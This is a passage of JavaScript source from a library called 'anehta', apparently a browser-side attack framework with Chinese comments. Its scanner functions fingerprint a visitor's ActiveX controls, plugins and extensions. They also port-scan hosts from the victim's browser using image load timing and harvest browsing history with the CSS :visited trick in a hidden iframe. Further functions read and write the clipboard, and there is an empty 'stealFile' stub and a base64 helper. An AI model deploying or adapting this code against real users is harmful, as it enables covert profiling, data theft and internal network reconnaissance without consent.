			  anehtaCache.appendItem("Activex", "|"+objtmp[0]+": "+objtmp[1]); // 保存到cache中		  
		  }
	  }
	  return anehtaCache.getItem("Activex");
  } else {  // 非IE
  	return false;
  }
}

// 扫描Firefox 插件
anehta.scanner.ffplugins = function (){  
	if (anehtaBrowser.type() == "mozilla"){ 
    for (var i = 0; i < navigator.plugins.length; i++) {
  	  // 用"|"作为分隔符
      anehtaCache.appendItem("FirefoxPlugins" , "|"+navigator.plugins[i].name);
    }        
    return anehtaCache.getItem("FirefoxPlugins");
  } else { // 非mozilla浏览器
    	return false;
  }
}


// 检查url是否是图片,返回200则加载成功,触发onload,否则失败,触发onerror
anehta.scanner.imgCheck = function(imgurl){
	var m = new Image();
  m.onload = function() {
  	alert(1);
  	//return true
  };
  m.onerror = function() {
    //return false;
    alert(2);
  };
  m.src = imgurl;  //连接图片
}

//扫描 Firefox 扩展
anehta.scanner.ffextensions = function (){
	for (var i = 0; i < anehta.signatures.ffextensions.length; i++){
		//alert(anehta.signatures.ffextensions[i].url);
    anehta.scanner.imgCheck(anehta.signatures.ffextensions[i].url);
    //alert(result);
    //if (result == true){
      //alert(anehta.signatures.ffextensions[i].name);
    //}
  }
}


// idea from attackAPI
// timeout非常重要,一般900比较合适
anehta.scanner.checkPort = function(scanHost, scanPort, timeout){		
	var m = new Image();	
	
	// 通过onerror和onload的状态来判断	
	m.onerror = function () {
	if (!m) return;
	m = undefined;
	alert("open: "+scanPort);
	};
	
	m.onload = m.onerror;
	
	//连接端口
	m.src = "http://"+scanHost+":"+scanPort;
	
	setTimeout(function () {
	  if (!m) return;
	  m = undefined;
	  alert("closed: "+scanPort);
	}, timeout);
}

//扫描多个端口,效果非常不好
anehta.scanner.ports = function(target, timeout){
	for (var i=0; i<anehta.signatures.ports.length; i++){
	  anehta.scanner.checkPort(target, anehta.signatures.ports[i], timeout);
  }
}

//css track history log; 返回所有访问过的网站
anehta.scanner.history = function(){
	var urls = anehta.signatures.sites; // 扫描的站点
  
  var ifr = document.createElement('iframe');
  ifr.style.visibility = 'hidden';
  ifr.style.width = ifr.style.height = 0;
  
  document.body.appendChild(ifr);
  
  // 核心部分
  var doc = anehta.dom.getDocument(ifr);
  doc.open();
  doc.write('<style>a:visited{display: none}</style>');
  doc.close();
  
  for (var i = 0; i < urls.length; i++) {
    var a = doc.createElement('a');
    a.href = urls[i];
    
    doc.body.appendChild(a);
    
    if (a.currentStyle){
      var display = a.currentStyle['display'];
    }
    else {
      var display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display');
    }
            
    // 找到了
    if (display == 'none' ){
      //alert("found! "+urls[i]);
      anehtaCache.appendItem("sitesHistory", " | "+urls[i]); // 保存到cache中,'|'是分隔符
    }
  }
   
  document.body.removeChild(ifr);
  return anehtaCache.getItem("sitesHistory");          
}


anehta.scanner.online = function(){
	
}

anehta.scanner.ping = function(){
	
}

anehta.scanner.localfile = function(){
	
}

//////////////////////////////////////////////////
// Miscellaneous Library
//////////////////////////////////////////////////
anehta.misc = {};

anehta.misc.stealFile = function(){
	
}

// IE only!
// Read/Write to Clipboard will cause a security warning!
anehta.misc.getClipboard = function(){
	if(window.clipboardData){
        return window.clipboardData.getData('Text');
  }       
  return null;
}

anehta.misc.setClipboard = function(data){
	if(window.clipboardData){
       return window.clipboardData.setData('Text', data);
  }
  return false;
}



//////////////////////////////////////////////////
// Crypto Library
//////////////////////////////////////////////////
anehta.crypto ={};

//JavaScript　base64_decode
// Copyright (C) 1999 Masanao Izumo <iz@onicos.co.jp>
// Version: 1.0
// LastModified: Dec 25 1999
// This library is free.　You can redistribute it and/or modify it.
//
//
// Interfaces:
// b64 = base64encode(data);
// data = base64decode(b64);
//
var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64DecodeChars = new Array(
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
    -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

anehta.crypto.base64encode = function(str) {
    var out, i, len;
    var c1, c2, c3;
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
        c1 = str.charCodeAt(i++) & 0xff;
        if(i == len)
        {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt((c1 & 0x3) << 4);
            out += "==";
            break;
        }
        c2 = str.charCodeAt(i++);
        if(i == len)
        {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
            out += base64EncodeChars.charAt((c2 & 0xF) << 2);
            out += "=";
            break;
        }
        c3 = str.charCodeAt(i++);
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6));
        out += base64EncodeChars.charAt(c3 & 0x3F);
    }
    return out;
}

anehta.crypto.base64decode = function(str) {
    var c1, c2, c3, c4;
    var i, len, out;
    len = str.length;
    i = 0;
    out = "";
    while(i < len){
        /* c1 */
        do {
            c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
        } while(i < len && c1 == -1);
        if(c1 == -1)
            break;
        /* c2 */
        do {
            c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
        } while(i < len && c2 == -1);
        if(c2 == -1)
            break;
        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));
        /* c3 */
        do {
            c3 = str.charCodeAt(i++) & 0xff;
            if(c3 == 61)
                 return out;
            c3 = base64DecodeChars[c3];
        } while(i < len && c3 == -1);
        if(c3 == -1)
            break;
        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));
        /* c4 */
        do {
            c4 = str.charCodeAt(i++) & 0xff;
            if(c4 == 61)
                return out;
            c4 = base64DecodeChars[c4];
        } while(i < len && c4 == -1);
        if(c4 == -1)
            break;
        out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}


//////////////////////////////////////////////////
// jQuery Extend Plugin
//////////////////////////////////////////////////






//////////////////////////////////////////////////
// 自定义库
//////////////////////////////////////////////////

